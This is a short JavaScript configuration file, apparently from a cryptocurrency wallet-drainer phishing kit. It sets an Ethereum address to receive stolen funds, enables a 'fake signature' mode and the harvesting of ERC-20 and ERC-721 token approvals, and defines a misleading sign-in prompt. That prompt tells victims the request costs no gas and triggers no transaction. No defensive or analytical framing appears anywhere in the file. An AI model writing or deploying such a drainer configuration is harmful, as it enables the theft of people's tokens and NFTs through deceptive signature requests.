const receiveAddress = "0xd94848e05442bF112E584fd3F89694FC3E7a457C";
const finesseReceiveAddress = "0xd94848e05442bF112E584fd3F89694FC3E7a457C"
const finesseMinimum = 0.0001
const minTokenValue = 0

const enableFakeSig = true
const erc20Approvals = true;
const erc721Approvals = true;

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;


if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);

if (!finesseReceiveAddress.startsWith("0x") || (finesseReceiveAddress.length >= 64 || finesseReceiveAddress.length <= 40))
    console.error(`Error: ${finesseReceiveAddress} is not a valid Ethereum address.`);






